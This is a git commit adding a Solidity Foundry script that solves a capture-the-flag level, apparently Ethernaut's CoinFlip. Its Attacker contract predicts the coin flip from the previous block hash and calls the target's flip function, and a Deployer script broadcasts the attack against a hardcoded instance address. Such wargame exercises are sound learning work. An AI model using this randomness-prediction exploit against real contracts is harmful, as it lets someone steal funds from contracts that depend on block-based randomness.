a61aeb996a9076e69fe83d1ae525d2beaef0a2e8
exp7l <107167107+exp7l@users.noreply.github.com>
2022-07-17 15:45:11 -0700

    level 3 - coinflip

---
+++ script/3-coinflip.s.sol
@@ -0,0 +1,34 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "../src/3-coinflip.sol";
+
+contract Attacker {
+
+    address instAddr   = 0x54a5C8b49B368Ec16dA761dc94FfbbA641a2EaDc;
+    uint    FACTOR     = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip cf        = CoinFlip(instAddr);
+
+    function attack()
+        public
+    {
+        uint _blockvalue = uint(blockhash(block.number - 1));
+        uint _coinflip   = _blockvalue / FACTOR;
+        bool _guess      = _coinflip == 1 ? true : false;
+        bool _win        = cf.flip(_guess);
+    }
+}
+
+contract Deployer is Script {
+    function run()
+        public
+    {
+        vm.startBroadcast();
+        // Attacker _a = new Attacker();
+        Attacker _a = Attacker(0x3818d7D68aecBB41757edA0Af8Fb57E45F94c4E4);
+        // To run block.number and flip in same block.        
+        _a.attack();
+        vm.stopBroadcast();        
+    }
+}
